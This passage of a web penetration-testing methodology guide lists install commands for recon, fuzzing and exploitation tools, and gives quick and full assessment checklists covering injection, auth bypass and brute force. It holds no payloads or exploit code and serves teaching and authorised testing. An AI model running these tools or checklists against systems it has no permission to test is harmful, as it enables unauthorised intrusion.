  | **httpx** | HTTP probing & tech detection | `go install github.com/projectdiscovery/httpx/cmd/httpx@latest` |
  | **waybackurls** | Wayback Machine URL extraction | `go install github.com/tomnomnom/waybackurls@latest` |
  | **gau** | Multi-source URL collection | `go install github.com/lc/gau/v2/cmd/gau@latest` |
  | **whatweb** | Technology fingerprinting | `apt install whatweb` |
  | **wafw00f** | WAF detection | `pip3 install wafw00f` |
  :::

  :::tabs-item{icon="i-lucide-search" label="Discovery Tools"}

  | Tool | Purpose | Install |
  |---|---|---|
  | **ffuf** | Fast web fuzzer (dirs, params, vhosts) | `go install github.com/ffuf/ffuf/v2@latest` |
  | **feroxbuster** | Recursive content discovery | `apt install feroxbuster` |
  | **gobuster** | Directory/DNS/vhost brute-forcing | `apt install gobuster` |
  | **arjun** | Hidden parameter discovery | `pip3 install arjun` |
  | **LinkFinder** | JS endpoint extraction | `pip3 install linkfinder` |
  | **katana** | Web crawler | `go install github.com/projectdiscovery/katana/cmd/katana@latest` |
  :::

  :::tabs-item{icon="i-lucide-bug" label="Exploitation Tools"}

  | Tool | Purpose | Install |
  |---|---|---|
  | **Burp Suite** | Web proxy & scanner (essential) | [portswigger.net](https://portswigger.net/burp) |
  | **sqlmap** | Automated SQL injection | `apt install sqlmap` |
  | **dalfox** | XSS scanner & exploitation | `go install github.com/hahwul/dalfox/v2@latest` |
  | **nuclei** | Template-based vulnerability scanner | `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest` |
  | **jwt_tool** | JWT analysis & exploitation | `pip3 install jwt-tool` |
  | **Commix** | Automated command injection | `apt install commix` |
  | **tplmap** | SSTI detection & exploitation | `git clone https://github.com/epinna/tplmap` |
  :::

  :::tabs-item{icon="i-lucide-chrome" label="Browser Extensions"}

  | Extension | Purpose |
  |---|---|
  | **FoxyProxy** | Quick proxy switching (Burp/ZAP) |
  | **Wappalyzer** | Technology detection |
  | **Cookie-Editor** | Cookie manipulation |
  | **HackBar** | Quick payload injection |
  | **Retire.js** | Detect vulnerable JavaScript libraries |
  | **PwnFox** | Multi-container proxy for Firefox |
  :::
::

---

## Methodology Checklists

### Quick Assessment Checklist (2-Hour Test)

| # | Check | Time |
|---|---|---|
| 1 | Technology fingerprinting (Wappalyzer, headers) | 5 min |
| 2 | robots.txt, sitemap.xml, security.txt | 5 min |
| 3 | Directory brute-force (top 1000) | 10 min |
| 4 | Check for exposed admin panels | 5 min |
| 5 | Test login for default creds | 5 min |
| 6 | Test login for username enumeration | 10 min |
| 7 | Check all forms for XSS (reflected) | 15 min |
| 8 | Check parameters for SQLi | 15 min |
| 9 | Test IDOR on user-specific endpoints | 15 min |
| 10 | Security headers audit | 5 min |
| 11 | CORS misconfiguration check | 5 min |
| 12 | Nuclei scan (critical + high templates) | 15 min |
| 13 | Review JS files for secrets | 10 min |
| 14 | Document findings | 15 min |

### Full Assessment Checklist

::collapsible

| Phase | Check | Status |
|---|---|---|
| **Recon** | Subdomain enumeration | ☐ |
| | DNS records (MX, TXT, NS, AXFR) | ☐ |
| | Technology fingerprinting | ☐ |
| | WAF detection | ☐ |
| | Wayback Machine / archive URLs | ☐ |
| | Google dorking | ☐ |
| | GitHub/GitLab secret scanning | ☐ |
| | S3/Cloud bucket enumeration | ☐ |
| **Mapping** | Directory brute-force (multiple wordlists) | ☐ |
| | File discovery (.env, .git, backups) | ☐ |
| | Parameter discovery (GET, POST, JSON, headers) | ☐ |
| | API documentation discovery | ☐ |
| | Virtual host enumeration | ☐ |
| | Application sitemap construction | ☐ |
| | User role functionality mapping | ☐ |
| **Auth** | Default credentials | ☐ |
| | Username enumeration | ☐ |
| | Brute-force / lockout testing | ☐ |
| | Password reset flow testing | ☐ |
| | JWT/token analysis | ☐ |
| | OAuth flow testing | ☐ |
| | Session fixation | ☐ |
| | Session management (expiry, rotation) | ☐ |
| | MFA bypass testing | ☐ |
| **AuthZ** | IDOR (horizontal escalation) | ☐ |
| | Vertical privilege escalation | ☐ |
| | Path traversal bypass | ☐ |
| | HTTP method override | ☐ |
| | Force browsing to protected pages | ☐ |
| | Parameter-based role manipulation | ☐ |
| **Injection** | SQL injection (all input vectors) | ☐ |
| | Reflected XSS | ☐ |
| | Stored XSS | ☐ |
| | DOM-based XSS | ☐ |
| | SSTI (template injection) | ☐ |
| | SSRF | ☐ |
| | XXE (if XML accepted) | ☐ |
| | Command injection | ☐ |
| | LDAP injection | ☐ |
| | NoSQL injection | ☐ |
| | Header injection (CRLF) | ☐ |
| **Files** | File upload bypass | ☐ |
| | Path traversal / LFI | ☐ |
| | Remote file inclusion (RFI) | ☐ |
| **Logic** | Price/quantity manipulation | ☐ |
| | Workflow/step bypass | ☐ |
| | Race conditions | ☐ |
| | Feature abuse | ☐ |
| **Config** | Security headers audit | ☐ |
| | CORS misconfiguration | ☐ |
| | Cookie flags (Secure, HttpOnly, SameSite) | ☐ |
| | TLS/SSL configuration | ☐ |
| | Error handling (verbose errors) | ☐ |
| | Debug endpoints / admin interfaces | ☐ |
| | Subdomain takeover | ☐ |
| **API** | API version testing | ☐ |
| | Mass assignment | ☐ |
| | Rate limiting | ☐ |
| | GraphQL introspection | ☐ |
| | Batch/array parameter abuse | ☐ |

::

---

## Reference & Resources

::card-group
  ::card
  ---
  title: OWASP Web Security Testing Guide
  icon: i-lucide-shield
  to: https://owasp.org/www-project-web-security-testing-guide/
  target: _blank
  ---
  The definitive open-source guide for web application security testing. Comprehensive methodology with test cases for every vulnerability category.
  ::

  ::card
  ---
  title: PortSwigger Web Security Academy
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security
  target: _blank
  ---
  Free, hands-on training covering every web vulnerability type with interactive labs. The best resource for learning web hacking from scratch to advanced.
  ::

  ::card
  ---
  title: HackTricks — Web Pentesting
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/index.html
  target: _blank
  ---
  Exhaustive web testing methodology with payloads, bypass techniques, and tool usage for every vulnerability class.
  ::

  ::card
  ---
  title: PayloadsAllTheThings — Web
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Community-maintained repository of payloads and bypass techniques for SQLi, XSS, SSRF, SSTI, XXE, and dozens more vulnerability types.
  ::

  ::card
  ---
  title: OWASP Top 10 — 2021
  icon: i-lucide-list-ordered
  to: https://owasp.org/Top10/
  target: _blank
  ---
  The industry-standard awareness document for web application security risks. Updated every 3-4 years based on real-world vulnerability data.
  ::

  ::card
  ---
  title: Nuclei Templates
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/nuclei-templates
  target: _blank
  ---
  Community-powered vulnerability templates for the Nuclei scanner. Covers CVEs, misconfigurations, exposures, and default credentials.
  ::
::

---

::tip{to="/guides/burp-suite-guide"}
**New to web testing?** Start with our Burp Suite setup guide to configure your proxy and browser correctly before following this methodology.
::